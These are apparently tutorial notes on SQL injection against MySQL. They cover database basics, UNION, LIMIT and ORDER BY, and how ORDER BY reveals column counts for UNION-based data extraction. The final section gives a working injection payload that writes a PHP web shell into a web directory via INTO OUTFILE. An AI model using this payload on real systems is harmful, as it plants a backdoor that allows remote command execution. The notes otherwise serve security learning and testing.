#### 0.0. Classic MySQL error message

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for 
the right syntax to use near ''' at line 1
```

#### 1.1. About databases

Database anatomy:

- a database sever (MySQL, MS-SQL, PostgreSQL) may contain one or more databases
- each database has a number of tables
- each table has one or more columns (keys) and rows (values)
- the rows are also called database records or database entries

Database administration:

- a database server connection requires login credentials
- database access control can be set per user/role (w/ or w/o administrative privileges)
- database roles can restrict permissions to what actions a user can perform:
  - only `root` user has access to DMBS-related assets (e.g. `mysql` database from MySQL)
  - user `app_user` has access to application databases
  - file system access (I/O)
  - CRUD permissions must be specified explicitly


#### 1.2. MySQL keywords - generic

```
ALTER  : Modify tables with ALTER TABLE
CREATE : Make new database, table, or index
DELETE : Remove rows from tables
DROP   : Remove databases or tables
INDEX  : Create or remove indexes for tables
INSERT : Add rows to tables
SELECT : Select records from tables
UPDATE : Modify records in tables

GRANT OPTION   : grant or remove other users' privileges
ALL PRIVILEGES : MySQL user full access to a designated database
```


#### 1.3. MySQL keywords - `UNION / LIMIT`

```
mysql> SELECT x,y,z FROM table_1 UNION SELECT a,b,c FROM table2;
```

Will concatenate two (or more) `SELECT` result tables together as `DISTINCT` results only; 
`UNION ALL` should be used for duplicate values. Each `SELECT` statement must have the same 
number of columns, otherwise the DBMS will throw an error. Depending on the DBMS, columns must 
also have similar data type, and must be selected in the same order.

What if following query returns 100000 results?
```
mysql > SELECT * FROM news WHERE u_id = 121;
```

Limit the results to first 100 entries:
```
mysql> SELECT * FROM news WHERE news_id = 121 LIMIT 100;
mysql> SELECT * FROM news WHERE news_id = 121 LIMIT {x};
```
Where `{x}` is an integer (0, 1, 2, 3, etc...)


#### 1.4. MySQL keywords - `ORDER BY`

`ORDER BY` can be used in SQL injection to determine the number of columns to be used for 
exfiltration via `UNION SELECT`. Where {x} is the column index to be ordered by 
(e.g. `ORDER BY 4` means order by column with index `4`).

Data in result set can be ordered by specific column/type:
```
mysql> SELECT X,Y,Z FROM table1 ORDER BY 3;
mysql> SELECT X,Y,Z FROM table1 ORDER BY {x};
```

#### 1.5. File access

Working with files:
```
mysql> SELECT ... LOAD_INFILE # read file
mysql> SELECT INTO OUTFILE/DUMPFILE # write file
```

Writing a PHP backdoor (injection payload):
```
f' UNION SELECT "<?=system($_REQUEST['cmd']);?>" INTO OUTFILE '/var/www/html/images/13.php'#
```
